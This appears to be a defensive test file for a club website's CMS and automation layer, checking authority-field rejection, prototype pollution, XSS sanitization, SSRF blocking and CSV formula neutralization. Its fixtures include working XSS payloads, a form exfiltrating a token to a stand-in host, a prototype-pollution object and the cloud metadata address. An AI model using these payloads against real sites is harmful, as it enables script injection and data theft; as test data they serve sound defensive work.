import { describe, expect, it, vi } from "vitest";
import { validateContent } from "../../src/features/cms/cms_validation";
import { operations } from "../../src/integrations/automation/catalogue";
import { ReferenceHttpTransport } from "../../src/integrations/automation/ReferenceWebsiteClient";
import { CalendarFeedClient } from "../../src/features/calendar/providers/CalendarFeedClient";
import { WebhookClient } from "../../src/infrastructure/http/WebhookClient";
import { formSubmitSchema } from "../../src/features/forms/form_schemas";
import { csvCell } from "../../src/features/forms/form_answers";
import { DomainError } from "../../src/core/DomainError";
import type { TrustedActor } from "../../src/core/authorization/AuthorizationService";
import type { AutomationContext } from "../../src/integrations/automation/operation";

describe("Adversarial content and outbound boundaries", () => {
  it("rejects caller-authority fields and prototype keys while validating explicit target identities", () => {
    for (const operation of operations) {
      // Directory profiles have a public job/club role label; it is not membership authority.
      for (const name of [
        "organizationId",
        "userId",
        "managerUserId",
        "actor",
        "principal",
        "sessionId",
        "membershipRole",
        "authMethod",
        "permissions",
        "published",
        "__proto__",
      ]) {
        const input = JSON.parse(JSON.stringify(operation.example));
        Object.defineProperty(input, name, {
          value: "owner",
          enumerable: true,
        });
        const targetField =
          (operation.name === "events_team_set" && name === "userId") ||
          (operation.name === "events_manager_set" && name === "managerUserId");
        expect(
          operation.input.safeParse(input).success,
          `${operation.name}: ${name}`,
        ).toBe(targetField);
        if (targetField) {
          // A target account ID is data; it never accepts an embedded actor or role grant.
          expect(
            operation.input.safeParse({
              ...operation.example,
              [name]: { userId: "owner", role: "owner" },
            }).success,
          ).toBe(false);
        }
      }
    }
    const payload = JSON.parse(
      '{"requestId":"11111111-1111-4111-8111-111111111111","versionId":"11111111-1111-4111-8111-111111111111","answers":{"__proto__":{"polluted":true}}}',
    );
    // Zod's record parser discards __proto__ before validating record entries.
    // The decisive boundary is that no attacker-owned prototype survives parsing.
    expect(formSubmitSchema.parse(payload).answers).toEqual({});
    expect(Reflect.get({}, "polluted")).toBeUndefined();
  });

  it("authorizes event access changes against the trusted caller, never the requested target account", async () => {
    const actor: TrustedActor = {
      userId: "authenticated-caller",
      email: "fixture@example.test",
      emailVerified: true,
      sessionId: "trusted-session",
      authenticatedAt: new Date(),
      authMethod: "email-otp",
    };
    const authorize = vi
      .fn()
      .mockRejectedValue(
        new DomainError(
          "ACCESS_DENIED",
          "The current caller cannot manage staff.",
        ),
      );
    const context = {
      principal: {
        actor,
        organizationId: "trusted-club",
        scopes: ["access:roles"],
      },
      services: { authorization: { require: authorize } },
    } as unknown as AutomationContext;
    for (const name of ["events_team_set", "events_manager_set"]) {
      const entry = operations.find((item) => item.name === name)!;
      expect(entry.input.safeParse(entry.example).success).toBe(true);
      await expect(entry.run(context, entry.example)).rejects.toMatchObject({
        code: "ACCESS_DENIED",
        status: 403,
      });
      expect(authorize).toHaveBeenLastCalledWith(actor, "members.manage");
    }
    expect(authorize).toHaveBeenCalledTimes(2);
  });

  it("removes active markup and obfuscated script links from top-level and nested rich text", () => {
    const payloads = [
      '<img src=x onerror="window.compromised=true">',
      '<svg><a xlink:href="javascript:alert(1)">link</a></svg>',
      '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">',
      '<a href="java&#x09;script:alert(1)" onclick="alert(1)">link</a>',
      '<a href="&#106;avascript:alert(1)">link</a>',
      '<iframe srcdoc="<script>alert(1)</script>"></iframe><script>alert(1)</script>',
      '<form action="https://exfil.example.invalid"><input name="token"></form>',
      '<p style="background:url(https://exfil.example.invalid)">text</p>',
    ];
    for (const text of payloads) {
      const leaf = {
        type: "RichText",
        props: { id: "probe", version: 1, text },
      };
      const data = validateContent(
        {
          root: { props: {} },
          content: [
            leaf,
            {
              type: "Columns",
              props: {
                id: "columns",
                version: 1,
                ratio: "balanced",
                left: [{ ...leaf, props: { ...leaf.props, id: "nested" } }],
                right: [],
              },
            },
          ],
        },
        "page",
      );
      for (const block of data.content) {
        const texts = block.type === "Columns" ? block.props.left : [block];
        for (const rich of texts) {
          expect(rich.type).toBe("RichText");
          if (rich.type !== "RichText")
            throw new Error("Missing rich text fixture");
          expect(rich.props.text).not.toMatch(
            /<(?:script|svg|math|iframe|img|form|input|style)\b|\s(?:on\w+|style)\s*=|href\s*=\s*["']?javascript:/i,
          );
        }
      }
    }
  });

  it("blocks private, metadata, reserved and mixed DNS answers in every configurable outbound adapter", async () => {
    const targets = [
      "0.0.0.0",
      "10.1.2.3",
      "100.100.100.200",
      "127.0.0.1",
      "169.254.169.254",
      "172.16.1.1",
      "172.31.255.255",
      "192.168.1.1",
      "192.0.0.1",
      "198.18.0.1",
      "198.51.100.1",
      "203.0.113.1",
      "224.0.0.1",
      "255.255.255.255",
    ];
    for (const address of targets) {
      // Inject DNS only. Production adapters must refuse before opening any socket.
      const resolve = async () => [
        { address: "8.8.8.8", family: 4 },
        { address, family: 4 },
      ];
      await expect(
        new ReferenceHttpTransport(resolve).read(
          "https://www.rotary.org/",
          100,
        ),
      ).rejects.toMatchObject({ code: "SOURCE_ADDRESS_BLOCKED" });
      await expect(
        new CalendarFeedClient(true, resolve).read(
          "https://www.rotary.org/calendar.ics",
        ),
      ).rejects.toThrow("FEED_ADDRESS_BLOCKED");
      await expect(
        new WebhookClient(true, resolve).send(
          "https://www.rotary.org/hook",
          "{}",
          {},
        ),
      ).rejects.toThrow("WEBHOOK_ADDRESS_BLOCKED");
    }
  });

  it("neutralizes spreadsheet formulas including whitespace and line-break prefixes", () => {
    for (const value of [
      "=1+1",
      "+SUM(1,2)",
      "@SUM(1,2)",
      "-1+1",
      "\t=1",
      "\n=1",
      " \r\n=1",
      "\u00a0=1",
    ]) {
      expect(csvCell(value).startsWith("\"'")).toBe(true);
    }
    expect(csvCell('ordinary "quoted", text')).toBe(
      '"ordinary ""quoted"", text"',
    );
  });
});
